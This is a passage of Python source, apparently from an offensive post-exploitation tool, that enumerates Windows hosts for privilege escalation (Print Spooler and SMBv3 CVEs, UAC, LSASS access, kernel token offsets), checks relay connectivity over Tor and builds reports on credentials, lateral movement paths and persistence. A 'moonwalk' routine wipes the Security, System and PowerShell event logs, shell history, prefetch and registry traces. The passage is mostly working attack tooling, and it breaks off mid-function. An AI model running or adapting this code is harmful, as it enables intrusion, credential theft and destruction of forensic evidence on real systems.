                    if '1909' in stdout:
                        pe_data['windows_version']['token_offset'] = '0x360'
                    else:
                        pe_data['windows_version']['token_offset'] = '0x4B8'
                else:
                    pe_data['windows_version']['pe5_compatible'] = False
            
            # Check if PE5 framework is available
            progress.update(task, advance=15, description="[cyan]Checking PE5 framework availability...")
            pe5_framework_path = Path('pe5_framework_extracted/pe5_framework')
            if pe5_framework_path.exists():
                pe_data['pe5_available'] = True
                pe_data['pe5_framework_status']['path'] = str(pe5_framework_path)
                pe_data['pe5_framework_status']['exists'] = True
                
                # Check for compiled binaries
                build_bin = pe5_framework_path / 'build' / 'bin'
                if build_bin.exists():
                    binaries = list(build_bin.glob('pe5_*'))
                    pe_data['pe5_framework_status']['binaries'] = [str(b.name) for b in binaries]
                    pe_data['pe5_framework_status']['compiled'] = True
                else:
                    pe_data['pe5_framework_status']['compiled'] = False
            else:
                pe_data['pe5_available'] = False
                pe_data['pe5_framework_status']['exists'] = False
            
            # Enumerate PE techniques
            progress.update(task, advance=20, description="[cyan]Enumerating PE techniques...")
            
            # Print Spooler (CVE-2020-1337)
            ps_cmd = "Get-Service -Name Spooler -ErrorAction SilentlyContinue | Select-Object Name, Status, StartType"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                pe_data['pe_techniques']['print_spooler'] = {
                    'service_status': stdout,
                    'vulnerable': 'Running' in stdout
                }
            
            # UAC status
            exit_code, stdout, stderr = execute_cmd(
                "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA",
                lab_use=self.lab_use
            )
            if exit_code == 0:
                pe_data['pe_techniques']['uac'] = {
                    'status': stdout,
                    'enabled': '0x1' in stdout or '1' in stdout
                }
            
            # SMBv3 version check (CVE-2020-0796)
            ps_cmd = "Get-SmbServerConfiguration | Select-Object EnableSMB2Protocol"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                pe_data['pe_techniques']['smbv3'] = {
                    'config': stdout,
                    'smb_enabled': 'True' in stdout
                }
            
            # Token manipulation opportunities
            progress.update(task, advance=15, description="[cyan]Checking token manipulation opportunities...")
            ps_cmd = """
            $process = Get-Process -Id $PID
            $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            
            # Check SeDebugPrivilege
            $hasDebug = $false
            try {
                $debugProc = Get-Process -Name lsass -ErrorAction SilentlyContinue
                if ($debugProc) { $hasDebug = $true }
            } catch {}
            
            @{
                CanAccessLSASS = $hasDebug
                ProcessId = $process.Id
                TokenHandle = $token.Token.Handle.ToString()
            } | ConvertTo-Json
            """
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                try:
                    pe_data['pe_techniques']['token_manipulation'] = json.loads(stdout)
                except:
                    pe_data['pe_techniques']['token_manipulation'] = {'raw': stdout}
            
            # Attempt PE5 escalation if available and not already SYSTEM
            if pe_data['pe5_available'] and not pe_data['current_privileges'].get('IsSystem', False):
                progress.update(task, advance=10, description="[yellow]PE5 escalation available but not attempted (requires manual execution)")
                pe_data['escalation_attempted'] = False
                pe_data['escalation_note'] = 'PE5 escalation requires manual execution for safety'
            elif pe_data['current_privileges'].get('IsSystem', False):
                pe_data['escalation_successful'] = True
                pe_data['escalation_note'] = 'Already running as SYSTEM'
            
            self.enumeration_data['privilege_escalation'] = pe_data
            progress.update(task, advance=100, description="[green]Privilege escalation enumeration complete")
        
        except Exception as e:
            self.enumeration_data['privilege_escalation']['error'] = str(e)
            progress.update(task, advance=100)
    
    def _enumerate_relay_connectivity(self, progress, task):
        """Enumerate relay client connectivity options"""
        try:
            relay_data = {
                'relay_configured': False,
                'relay_endpoints': [],
                'connectivity_tests': {},
                'tor_available': False
            }
            
            # Check for relay client configuration
            progress.update(task, advance=20, description="[cyan]Checking relay configuration...")
            config_paths = [
                Path.home() / '.config' / 'ai-relay' / 'client.yaml',
                Path('/etc/ai-relay/client.yaml'),
                Path('config/remote_guided.yaml')
            ]
            
            relay_config = None
            for config_path in config_paths:
                if config_path.exists():
                    try:
                        try:
                            import yaml
                        except ImportError:
                            relay_data['config_error'] = 'PyYAML not available'
                            break
                        
                        with open(config_path, 'r') as f:
                            relay_config = yaml.safe_load(f)
                        relay_data['relay_configured'] = True
                        relay_data['config_path'] = str(config_path)
                        relay_data['config'] = {
                            'relay_host': relay_config.get('relay_host', 'N/A'),
                            'relay_port': relay_config.get('relay_port', 'N/A'),
                            'use_tls': relay_config.get('use_tls', False),
                            'use_tor': relay_config.get('use_tor', False)
                        }
                        break
                    except Exception as e:
                        relay_data['config_error'] = str(e)
            
            if not relay_config:
                relay_data['relay_configured'] = False
                relay_data['note'] = 'No relay configuration found'
            
            # Test relay connectivity if configured
            if relay_config:
                progress.update(task, advance=30, description="[cyan]Testing relay connectivity...")
                relay_host = relay_config.get('relay_host', '')
                relay_port = relay_config.get('relay_port', 8889)
                
                # Test basic connectivity (without actually connecting)
                relay_data['connectivity_tests'] = {
                    'host': relay_host,
                    'port': relay_port,
                    'tls_enabled': relay_config.get('use_tls', False),
                    'tor_enabled': relay_config.get('use_tor', False)
                }
                
                # Check if host is .onion (Tor)
                if relay_host.endswith('.onion'):
                    relay_data['tor_required'] = True
                    relay_data['connectivity_tests']['transport'] = 'Tor (.onion)'
                elif relay_config.get('use_tor', False):
                    relay_data['tor_required'] = True
                    relay_data['connectivity_tests']['transport'] = 'Tor (SOCKS5)'
                else:
                    relay_data['tor_required'] = False
                    relay_data['connectivity_tests']['transport'] = 'Direct'
            
            # Check for Tor availability
            progress.update(task, advance=20, description="[cyan]Checking Tor availability...")
            tor_checks = {
                'tor_installed': False,
                'tor_running': False,
                'socks5_proxy': None
            }
            
            # Check if Tor is installed
            exit_code, stdout, stderr = execute_cmd("where tor", lab_use=self.lab_use)
            if exit_code == 0:
                tor_checks['tor_installed'] = True
                tor_checks['tor_path'] = stdout.strip()
            
            # Check if Tor service is running
            ps_cmd = "Get-Service -Name tor -ErrorAction SilentlyContinue | Select-Object Name, Status"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0 and 'tor' in stdout.lower():
                tor_checks['tor_running'] = 'Running' in stdout
            
            # Check SOCKS5 proxy (default Tor port)
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex(('127.0.0.1', 9050))
                sock.close()
                if result == 0:
                    tor_checks['socks5_proxy'] = '127.0.0.1:9050'
                    tor_checks['proxy_accessible'] = True
                else:
                    tor_checks['proxy_accessible'] = False
            except:
                tor_checks['proxy_accessible'] = False
            
            relay_data['tor_available'] = tor_checks['tor_installed'] and tor_checks.get('proxy_accessible', False)
            relay_data['tor_status'] = tor_checks
            
            self.enumeration_data['relay_connectivity'] = relay_data
            progress.update(task, advance=100, description="[green]Relay connectivity enumeration complete")
        
        except Exception as e:
            self.enumeration_data['relay_connectivity']['error'] = str(e)
            progress.update(task, advance=100)
    
    def _enumerate_tooling_integration(self, progress, task):
        """Enumerate comprehensive tooling integration and usage"""
        try:
            tooling_data = {
                'modules_available': {},
                'tools_used': [],
                'integration_status': {}
            }
            
            # Check available modules
            progress.update(task, advance=15, description="[cyan]Checking available modules...")
            modules_to_check = {
                'PE5': 'modules.pe5_system_escalation',
                'Relay Client': 'modules.relay_client',
                'LogHunter': 'modules.loghunter_integration',
                'MADCert': 'modules.madcert_integration',
                'LOLBins': 'modules.lolbins_reference',
                'Moonwalk': 'modules.loghunter_integration'
            }
            
            for module_name, module_path in modules_to_check.items():
                try:
                    __import__(module_path)
                    tooling_data['modules_available'][module_name] = True
                except ImportError:
                    tooling_data['modules_available'][module_name] = False
            
            # Check PE5 utilities
            progress.update(task, advance=15, description="[cyan]Checking PE5 utilities...")
            try:
                from modules.pe5_utils import PE5Utils
                pe5_utils = PE5Utils()
                tooling_data['integration_status']['pe5_utils'] = {
                    'available': True,
                    'techniques': list(pe5_utils.get_technique_info().keys())
                }
            except:
                tooling_data['integration_status']['pe5_utils'] = {'available': False}
            
            # Check relay client
            progress.update(task, advance=15, description="[cyan]Checking relay client...")
            try:
                from modules.relay_client import RelayClient, RelayClientConfig
                tooling_data['integration_status']['relay_client'] = {'available': True}
                
                # Try to load config
                try:
                    config = RelayClientConfig()
                    tooling_data['integration_status']['relay_client']['config_loaded'] = True
                    tooling_data['integration_status']['relay_client']['relay_host'] = config.get_relay_host()
                except:
                    tooling_data['integration_status']['relay_client']['config_loaded'] = False
            except:
                tooling_data['integration_status']['relay_client'] = {'available': False}
            
            # Track tools used during enumeration
            progress.update(task, advance=20, description="[cyan]Tracking tools used...")
            tooling_data['tools_used'] = {
                'lolbins': list(set(self.enumeration_data.get('lolbins_used', []))),
                'powershell_commands': len([k for k in self.enumeration_data.keys() if 'ps_cmd' in str(k)]),
                'cmd_commands': len([k for k in self.enumeration_data.keys() if 'cmd' in str(k).lower()]),
                'wmi_commands': len([k for k in self.enumeration_data.get('lolbins_used', []) if 'wmic' in k.lower()])
            }
            
            # Integration summary
            progress.update(task, advance=20, description="[cyan]Generating integration summary...")
            tooling_data['integration_summary'] = {
                'total_modules': len(tooling_data['modules_available']),
                'available_modules': sum(1 for v in tooling_data['modules_available'].values() if v),
                'pe5_ready': tooling_data['modules_available'].get('PE5', False),
                'relay_ready': tooling_data['modules_available'].get('Relay Client', False),
                'loghunter_ready': tooling_data['modules_available'].get('LogHunter', False),
                'moonwalk_ready': tooling_data['modules_available'].get('Moonwalk', False)
            }
            
            self.enumeration_data['tooling_integration'] = tooling_data
            progress.update(task, advance=100, description="[green]Tooling integration enumeration complete")
        
        except Exception as e:
            self.enumeration_data['tooling_integration']['error'] = str(e)
            progress.update(task, advance=100)
    
    def _perform_moonwalk_cleanup(self, progress, task):
        """Perform moonwalk cleanup after enumeration"""
        try:
            progress.update(task, advance=15, description="[cyan]Clearing event logs...")
            event_results = self.moonwalk.clear_event_logs(['Security', 'System', 'Application', 'PowerShell'])
            self.enumeration_data['moonwalk'] = {
                'event_logs': event_results
            }
            
            progress.update(task, advance=15, description="[cyan]Clearing PowerShell history...")
            self.moonwalk.clear_powershell_history()
            
            progress.update(task, advance=15, description="[cyan]Clearing command history...")
            self.moonwalk.clear_command_history()
            
            progress.update(task, advance=15, description="[cyan]Clearing registry traces...")
            reg_results = self.moonwalk.clear_registry_traces()
            self.enumeration_data['moonwalk']['registry'] = reg_results
            
            progress.update(task, advance=15, description="[cyan]Clearing prefetch...")
            self.moonwalk.clear_prefetch()
            
            progress.update(task, advance=15, description="[cyan]Clearing recent files...")
            self.moonwalk.clear_recent_files()
            
            progress.update(task, advance=10, description="[green]Moonwalk cleanup complete")
        
        except Exception as e:
            self.enumeration_data['moonwalk'] = {'error': str(e)}
            progress.update(task, advance=100)


class ReportGenerator:
    """Generate comprehensive enumeration reports"""
    
    def __init__(self, console: Console, enumeration_data: Dict[str, Any]):
        self.console = console
        self.data = enumeration_data
    
    def generate_text_report(self) -> str:
        """Generate text report"""
        report = []
        report.append("=" * 80)
        report.append("COMPREHENSIVE ENUMERATION REPORT")
        report.append(f"Generated: {self.data['timestamp']}")
        report.append("=" * 80)
        report.append("")
        
        # Initial Host
        report.append("INITIAL FOOTHOLD")
        report.append("-" * 80)
        report.append(f"Initial Host: {self.data.get('initial_host', 'Unknown')}")
        report.append("")
        
        # Foothold
        report.append("FOOTHOLD ASSESSMENT")
        report.append("-" * 80)
        if 'foothold' in self.data:
            fh = self.data['foothold']
            report.append(f"Identity: {fh.get('identity', 'Unknown')}")
            report.append(f"Role: {fh.get('role', 'Unknown')}")
            report.append(f"Groups: {len(fh.get('groups', []))} groups found")
            report.append(f"Privileges: {len(fh.get('privileges', []))} privileges")
            report.append(f"Listening Ports: {len(fh.get('listening_ports', []))} ports")
            if fh.get('listening_ports'):
                report.append(f"  Ports: {', '.join(fh['listening_ports'][:10])}")
        report.append("")
        
        # Orientation
        report.append("LOCAL ORIENTATION")
        report.append("-" * 80)
        if 'orientation' in self.data:
            orient = self.data['orientation']
            report.append(f"Local Groups: Found")
            report.append(f"Local Admins: Found")
            report.append(f"Domain Groups: {len(orient.get('domain_groups', []))} groups")
            report.append(f"Service Accounts: Found")
            report.append(f"Scheduled Tasks: Found")
            report.append(f"Security Software: Found")
        report.append("")
        
        # Identity
        report.append("IDENTITY & CREDENTIALS")
        report.append("-" * 80)
        if 'identity' in self.data:
            ident = self.data['identity']
            report.append(f"Stored Credentials: {'Found' if ident.get('stored_credentials') else 'None'}")
            report.append(f"Vault Credentials: {'Found' if ident.get('vault_credentials') else 'None'}")
            report.append(f"Domain Admins: {'Found' if ident.get('domain_admins') else 'None'}")
            report.append(f"LSASS Process: {'Found' if ident.get('lsass_process') else 'Not found'}")
        report.append("")
        
        # Network
        report.append("NETWORK DISCOVERY")
        report.append("-" * 80)
        if 'network' in self.data:
            net = self.data['network']
            report.append(f"Local IPs: {len(net.get('local_ips', []))} IPs")
            if net.get('local_ips'):
                report.append(f"  IPs: {', '.join(net['local_ips'][:5])}")
            report.append(f"ARP Targets: {len(net.get('arp_targets', []))} targets")
            report.append(f"Domains: {'Found' if net.get('domains') else 'None'}")
            report.append(f"Domain Controllers: {'Found' if net.get('domain_controllers') else 'None'}")
            report.append(f"Local Shares: {'Found' if net.get('local_shares') else 'None'}")
        report.append("")
        
        # Lateral Targets
        report.append("LATERAL MOVEMENT TARGETS")
        report.append("-" * 80)
        if 'lateral_targets' in self.data:
            targets = self.data['lateral_targets']
            if isinstance(targets, list):
                report.append(f"Potential Targets: {len(targets)}")
                for target in targets[:10]:
                    if isinstance(target, dict):
                        report.append(f"  - {target.get('target', 'Unknown')}: SMB={target.get('smb_accessible', False)}, WinRM={target.get('winrm_accessible', False)}")
            else:
                report.append("Potential Targets: 0")
        else:
            report.append("Potential Targets: 0")
        report.append("")
        
        # Lateral Movement Paths
        report.append("AUTOMATIC LATERAL MOVEMENT PATHS")
        report.append("-" * 80)
        if 'lateral_paths' in self.data:
            paths = self.data['lateral_paths']
            if isinstance(paths, list) and paths:
                report.append(f"Lateral Movement Paths: {len(paths)}")
                report.append(f"Maximum Depth Reached: {max([p.get('depth', 0) for p in paths] + [0])}")
                report.append("")
                for i, path_info in enumerate(paths, 1):
                    if isinstance(path_info, dict):
                        path = path_info.get('path', [])
                        depth = path_info.get('depth', 0)
                        method = path_info.get('method', 'unknown')
                        target = path_info.get('target', 'Unknown')
                        report.append(f"Path {i}: {' -> '.join(path)}")
                        report.append(f"  Depth: {depth}")
                        report.append(f"  Method: {method}")
                        enum = path_info.get('enumeration', {})
                        if enum.get('system_info', {}).get('os'):
                            report.append(f"  OS: {enum['system_info']['os'][:50]}")
                        if enum.get('shares'):
                            report.append(f"  Shares: {len(enum['shares'])} found")
                        report.append("")
            else:
                report.append("Lateral Movement Paths: 0")
        else:
            report.append("Lateral Movement Paths: 0")
        report.append("")
        
        # LOTL Techniques Used
        report.append("LOTL TECHNIQUES USED")
        report.append("-" * 80)
        if 'lolbins_used' in self.data:
            lolbins = self.data['lolbins_used']
            report.append(f"LOTL Commands Executed: {len(lolbins)}")
            report.append("")
            
            # Group by technique
            wmic_cmds = [c for c in lolbins if 'wmic' in c.lower()]
            schtasks_cmds = [c for c in lolbins if 'schtasks' in c.lower()]
            net_cmds = [c for c in lolbins if 'net view' in c.lower() or 'net share' in c.lower()]
            ps_cmds = [c for c in lolbins if 'powershell' in c.lower() or 'invoke' in c.lower()]
            
            if wmic_cmds:
                report.append(f"WMI Commands ({len(wmic_cmds)}):")
                for cmd in wmic_cmds[:10]:
                    report.append(f"  - {cmd}")
                report.append("")
            
            if schtasks_cmds:
                report.append(f"Scheduled Task Commands ({len(schtasks_cmds)}):")
                for cmd in schtasks_cmds[:10]:
                    report.append(f"  - {cmd}")
                report.append("")
            
            if net_cmds:
                report.append(f"Net Commands ({len(net_cmds)}):")
                for cmd in net_cmds[:10]:
                    report.append(f"  - {cmd}")
                report.append("")
            
            if ps_cmds:
                report.append(f"PowerShell Remoting ({len(ps_cmds)}):")
                for cmd in ps_cmds[:10]:
                    report.append(f"  - {cmd}")
                report.append("")
        report.append("")
        
        # Persistence
        report.append("PERSISTENCE MECHANISMS")
        report.append("-" * 80)
        if 'persistence' in self.data:
            persist = self.data['persistence']
            report.append(f"Recent Tasks: {'Found' if persist.get('recent_tasks') else 'None'}")
            report.append(f"Services: {'Found' if persist.get('services') else 'None'}")
            report.append(f"WMI Subscriptions: {'Found' if persist.get('wmi_subscriptions') else 'None'}")
            report.append(f"Registry Run Keys: {'Found' if persist.get('registry_run_hkcu') or persist.get('registry_run_hklm') else 'None'}")
        report.append("")
        
        # Certificates
        report.append("CERTIFICATES")
        report.append("-" * 80)
        if 'certificates' in self.data:
            certs = self.data['certificates']
            if certs.get('generated_certs'):
                report.append(f"Generated Certificates: {len(certs['generated_certs'])}")
                for cert in certs['generated_certs']:
                    report.append(f"  - {cert['name']} ({cert['type']})")
            else:
                report.append("Generated Certificates: None")
        report.append("")
        
        # Privilege Escalation (PE5)
        report.append("PRIVILEGE ESCALATION (PE5)")
        report.append("-" * 80)
        if 'privilege_escalation' in self.data:
            pe = self.data['privilege_escalation']
            if pe.get('current_privileges'):
                cp = pe['current_privileges']
                report.append(f"Current User: {cp.get('UserName', 'Unknown')}")
                report.append(f"Is SYSTEM: {cp.get('IsSystem', False)}")
                report.append(f"Is Admin: {cp.get('IsAdmin', False)}")
                report.append(f"Has Elevated Privileges: {cp.get('HasElevatedPrivileges', False)}")
            report.append(f"PE5 Framework Available: {pe.get('pe5_available', False)}")
            if pe.get('pe5_framework_status'):
                pfs = pe['pe5_framework_status']
                report.append(f"  Framework Path: {pfs.get('path', 'N/A')}")
                report.append(f"  Compiled: {pfs.get('compiled', False)}")
                if pfs.get('binaries'):
                    report.append(f"  Binaries: {', '.join(pfs['binaries'][:5])}")
            if pe.get('windows_version'):
                wv = pe['windows_version']
                report.append(f"Windows Version: {wv.get('info', 'Unknown')[:50]}")
                report.append(f"PE5 Compatible: {wv.get('pe5_compatible', False)}")
                if wv.get('token_offset'):
                    report.append(f"Token Offset: {wv['token_offset']}")
            if pe.get('pe_techniques'):
                pt = pe['pe_techniques']
                report.append("PE Techniques Available:")
                if pt.get('print_spooler'):
                    report.append(f"  Print Spooler: Service running")
                if pt.get('uac'):
                    uac_enabled = pt['uac'].get('enabled', False)
                    report.append(f"  UAC: {'Enabled' if uac_enabled else 'Disabled'}")
                if pt.get('smbv3'):
                    report.append(f"  SMBv3: {'Enabled' if pt['smbv3'].get('smb_enabled') else 'Disabled'}")
            report.append(f"Escalation Attempted: {pe.get('escalation_attempted', False)}")
            report.append(f"Escalation Successful: {pe.get('escalation_successful', False)}")
        report.append("")
        
        # Relay Connectivity
        report.append("RELAY CONNECTIVITY")
        report.append("-" * 80)
        if 'relay_connectivity' in self.data:
            rc = self.data['relay_connectivity']
            report.append(f"Relay Configured: {rc.get('relay_configured', False)}")
            if rc.get('config'):
                cfg = rc['config']
                report.append(f"  Relay Host: {cfg.get('relay_host', 'N/A')}")
                report.append(f"  Relay Port: {cfg.get('relay_port', 'N/A')}")
                report.append(f"  TLS Enabled: {cfg.get('use_tls', False)}")
                report.append(f"  Tor Enabled: {cfg.get('use_tor', False)}")
            if rc.get('connectivity_tests'):
                ct = rc['connectivity_tests']
                report.append(f"Transport: {ct.get('transport', 'N/A')}")
            report.append(f"Tor Available: {rc.get('tor_available', False)}")
            if rc.get('tor_status'):
                ts = rc['tor_status']
                report.append(f"  Tor Installed: {ts.get('tor_installed', False)}")
                report.append(f"  Tor Running: {ts.get('tor_running', False)}")
                if ts.get('socks5_proxy'):
                    report.append(f"  SOCKS5 Proxy: {ts['socks5_proxy']}")
        report.append("")
        
        # Tooling Integration
        report.append("TOOLING INTEGRATION")
        report.append("-" * 80)
        if 'tooling_integration' in self.data:
            ti = self.data['tooling_integration']
            if ti.get('modules_available'):
                ma = ti['modules_available']
                report.append("Available Modules:")
                for module, available in ma.items():
                    status = "✓" if available else "✗"
                    report.append(f"  {status} {module}")
            if ti.get('integration_summary'):
                isum = ti['integration_summary']
                report.append(f"Total Modules: {isum.get('total_modules', 0)}")
                report.append(f"Available: {isum.get('available_modules', 0)}")
                report.append(f"PE5 Ready: {isum.get('pe5_ready', False)}")
                report.append(f"Relay Ready: {isum.get('relay_ready', False)}")
                report.append(f"LogHunter Ready: {isum.get('loghunter_ready', False)}")
                report.append(f"Moonwalk Ready: {isum.get('moonwalk_ready', False)}")
            if ti.get('tools_used'):
                tu = ti['tools_used']
                report.append("Tools Used During Enumeration:")
                report.append(f"  LOLBins: {len(tu.get('lolbins', []))}")
                report.append(f"  PowerShell Commands: {tu.get('powershell_commands', 0)}")
                report.append(f"  CMD Commands: {tu.get('cmd_commands', 0)}")
                report.append(f"  WMI Commands: {tu.get('wmi_commands', 0)}")
        report.append("")
        
        # LogHunter
        report.append("LOGHUNTER ANALYSIS")
        report.append("-" * 80)
        if 'loghunter' in self.data:
            lh = self.data['loghunter']
            if lh.get('status'):
                report.append(f"Status: {lh['status']}")
            else:
                report.append("Credential Access: Found" if lh.get('credential_access') else "Credential Access: None")
                report.append("Lateral Movement: Found" if lh.get('lateral_movement') else "Lateral Movement: None")
                report.append("Privilege Escalation: Found" if lh.get('privilege_escalation') else "Privilege Escalation: None")
        report.append("")
        
        # Moonwalk Cleanup
        report.append("MOONWALK CLEANUP")
        report.append("-" * 80)
        if 'moonwalk' in self.data:
            mw = self.data['moonwalk']
            if mw.get('event_logs'):
                el = mw['event_logs']
                cleared = el.get('cleared', [])
                report.append(f"Event Logs Cleared: {len(cleared)}")
                if cleared:
                    report.append(f"  Logs: {', '.join(cleared[:5])}")
            report.append("PowerShell History: Cleared")
            report.append("Command History: Cleared")
            if mw.get('registry'):
                report.append("Registry Traces: Cleared")
        report.append("")
        
        # Summary
        report.append("ENUMERATION SUMMARY")
        report.append("-" * 80)
        report.append(f"Total Lateral Targets: {len(self.data.get('lateral_targets', []))}")
        report.append(f"Lateral Paths Explored: {len(self.data.get('lateral_paths', []))}")
        report.append(f"PE5 Available: {self.data.get('privilege_escalation', {}).get('pe5_available', False)}")
        report.append(f"Relay Configured: {self.data.get('relay_connectivity', {}).get('relay_configured', False)}")
        report.append(f"Tools Used: {len(self.data.get('lolbins_used', []))}")
        report.append("")
        
        report.append("=" * 80)
        report.append("END OF REPORT")
        report.append("=" * 80)
        
        return '\n'.join(report)
    
    def generate_json_report(self) -> str:
        """Generate JSON report"""
        return json.dumps(self.data, indent=2, default=str)
    
    def generate_html_report(self) -> str:
        """Generate HTML report"""
        html = []
        html.append("<!DOCTYPE html>")
        html.append("<html><head><title>Enumeration Report</title>")
        html.append("<style>body{font-family:Arial;margin:20px;}h1{color:#333;}h2{border-bottom:2px solid #333;padding-bottom:5px;}table{border-collapse:collapse;width:100%;}th,td{border:1px solid #ddd;padding:8px;text-align:left;}th{background-color:#4CAF50;color:white;}</style>")
        html.append("</head><body>")
        html.append(f"<h1>Comprehensive Enumeration Report</h1>")
        html.append(f"<p><strong>Generated:</strong> {self.data['timestamp']}</p>")
        
        # Foothold
        html.append("<h2>Foothold Assessment</h2>")
        if 'foothold' in self.data:
            fh = self.data['foothold']
            html.append(f"<p><strong>Identity:</strong> {fh.get('identity', 'Unknown')}</p>")
            html.append(f"<p><strong>Role:</strong> {fh.get('role', 'Unknown')}</p>")
            html.append(f"<p><strong>Groups:</strong> {len(fh.get('groups', []))} groups</p>")
            html.append(f"<p><strong>Listening Ports:</strong> {len(fh.get('listening_ports', []))} ports</p>")
        
        # Network
        html.append("<h2>Network Discovery</h2>")
        if 'network' in self.data:
            net = self.data['network']
            html.append(f"<p><strong>Local IPs:</strong> {len(net.get('local_ips', []))}</p>")
            html.append(f"<p><strong>ARP Targets:</strong> {len(net.get('arp_targets', []))}</p>")
        
        # Privilege Escalation
        html.append("<h2>Privilege Escalation (PE5)</h2>")
        if 'privilege_escalation' in self.data:
            pe = self.data['privilege_escalation']
            if pe.get('current_privileges'):
                cp = pe['current_privileges']
                html.append(f"<p><strong>Current User:</strong> {cp.get('UserName', 'Unknown')}</p>")
                html.append(f"<p><strong>Is SYSTEM:</strong> {cp.get('IsSystem', False)}</p>")
                html.append(f"<p><strong>Is Admin:</strong> {cp.get('IsAdmin', False)}</p>")
            html.append(f"<p><strong>PE5 Available:</strong> {pe.get('pe5_available', False)}</p>")
            html.append(f"<p><strong>Escalation Successful:</strong> {pe.get('escalation_successful', False)}</p>")
        
        # Relay Connectivity
        html.append("<h2>Relay Connectivity</h2>")
        if 'relay_connectivity' in self.data:
            rc = self.data['relay_connectivity']
            html.append(f"<p><strong>Relay Configured:</strong> {rc.get('relay_configured', False)}</p>")
            if rc.get('config'):
                cfg = rc['config']
                html.append(f"<p><strong>Relay Host:</strong> {cfg.get('relay_host', 'N/A')}</p>")
                html.append(f"<p><strong>TLS Enabled:</strong> {cfg.get('use_tls', False)}</p>")
            html.append(f"<p><strong>Tor Available:</strong> {rc.get('tor_available', False)}</p>")
        
        # Tooling Integration
        html.append("<h2>Tooling Integration</h2>")
        if 'tooling_integration' in self.data:
            ti = self.data['tooling_integration']
            if ti.get('integration_summary'):
                isum = ti['integration_summary']
                html.append(f"<p><strong>PE5 Ready:</strong> {isum.get('pe5_ready', False)}</p>")
                html.append(f"<p><strong>Relay Ready:</strong> {isum.get('relay_ready', False)}</p>")
                html.append(f"<p><strong>LogHunter Ready:</strong> {isum.get('loghunter_ready', False)}</p>")
                html.append(f"<p><strong>Moonwalk Ready:</strong> {isum.get('moonwalk_ready', False)}</p>")
            html.append(f"<p><strong>ARP Targets:</strong> {len(net.get('arp_targets', []))}</p>")
        
        # Lateral Targets
        html.append("<h2>Lateral Movement Targets</h2>")
        if 'lateral_targets' in self.data:
            targets = self.data['lateral_targets']
            if targets and isinstance(targets, list):
                html.append("<table><tr><th>Target</th><th>SMB</th><th>WinRM</th></tr>")
                for target in targets[:10]:
                    if isinstance(target, dict):
                        html.append(f"<tr><td>{target.get('target', 'Unknown')}</td>")
                        html.append(f"<td>{'Yes' if target.get('smb_accessible') else 'No'}</td>")
                        html.append(f"<td>{'Yes' if target.get('winrm_accessible') else 'No'}</td></tr>")
                html.append("</table>")
            else:
                html.append("<p>No targets found</p>")
        
        # Lateral Movement Paths
        html.append("<h2>Automatic Lateral Movement Paths</h2>")
        if 'lateral_paths' in self.data:
            paths = self.data['lateral_paths']
            if paths:
                html.append("<table><tr><th>Path</th><th>Depth</th><th>Method</th><th>Details</th></tr>")
                for path_info in paths:
                    if isinstance(path_info, dict):
                        path = path_info.get('path', [])
                        depth = path_info.get('depth', 0)
                        method = path_info.get('method', 'unknown')
                        html.append(f"<tr><td>{' -> '.join(path)}</td>")
                        html.append(f"<td>{depth}</td>")
                        html.append(f"<td>{method}</td>")
                        enum = path_info.get('enumeration', {})
                        html.append(f"<td>OS: {enum.get('system_info', {}).get('os', 'Unknown')[:30]}</td></tr>")
                html.append("</table>")
            else:
                html.append("<p>No lateral movement performed</p>")
        
        # LOTL Techniques
        html.append("<h2>LOTL Techniques Used</h2>")
        if 'lolbins_used' in self.data:
            lolbins = self.data['lolbins_used']
            html.append(f"<p><strong>Total LOTL Commands:</strong> {len(lolbins)}</p>")
            html.append("<ul>")
            for cmd in lolbins[:20]:
                html.append(f"<li>{cmd}</li>")
            html.append("</ul>")
        
        html.append("</body></html>")
        return '\n'.join(html)
    
    def display_report(self):
        """Display report in console"""
        self.console.print("\n[bold cyan]ENUMERATION REPORT[/bold cyan]\n")
        
        # Summary table
        table = Table(title="Enumeration Summary", box=box.ROUNDED)
        table.add_column("Category", style="cyan")
        table.add_column("Status", style="white")
        table.add_column("Items Found", style="green")
        
        # Foothold
        fh = self.data.get('foothold', {})
        table.add_row("Foothold", "Complete", f"{len(fh.get('groups', []))} groups, {len(fh.get('listening_ports', []))} ports")
        
        # Orientation
        orient = self.data.get('orientation', {})
        table.add_row("Orientation", "Complete", "Service accounts, tasks, security software")
        
        # Identity
        ident = self.data.get('identity', {})
        cred_count = sum([1 for k in ['stored_credentials', 'vault_credentials', 'domain_admins'] if ident.get(k)])
        table.add_row("Identity", "Complete", f"{cred_count} credential sources")
        
        # Network
        net = self.data.get('network', {})
        table.add_row("Network", "Complete", f"{len(net.get('local_ips', []))} IPs, {len(net.get('arp_targets', []))} targets")
        
        # Lateral Targets
        targets = self.data.get('lateral_targets', [])
        target_count = len(targets) if isinstance(targets, list) else 0
        table.add_row("Lateral Targets", "Complete", f"{target_count} targets")
        
        # Lateral Movement Paths
        paths = self.data.get('lateral_paths', [])
        path_count = len(paths) if isinstance(paths, list) else 0
        max_depth = max([p.get('depth', 0) for p in paths] + [0]) if paths and isinstance(paths, list) else 0
        table.add_row("Lateral Movement", "Complete", f"{path_count} paths (max depth: {max_depth})")
        
        # LOTL Techniques
        lolbins = self.data.get('lolbins_used', [])
        table.add_row("LOTL Techniques", "Complete", f"{len(lolbins)} commands executed")
        
        # Persistence
        persist = self.data.get('persistence', {})
        persist_count = sum([1 for k in ['recent_tasks', 'services', 'wmi_subscriptions'] if persist.get(k)])
        table.add_row("Persistence", "Complete", f"{persist_count} mechanisms")
        
        self.console.print(table)
        self.console.print()


class AutoEnumerateModule:
    """Auto-Enumeration Module for TUI"""
    
    def run(self, console: Console, session_data: dict):
        """Run auto-enumeration"""
        # Allow depth override
        default_depth = session_data.get('AUTO_ENUMERATE_DEPTH', 3)
        console.print(f"\n[bold cyan]Current lateral movement depth: {default_depth}[/bold cyan]")
        
        if Confirm.ask(f"[bold]Override depth? (default: {default_depth})[/bold]", default=False):
            try:
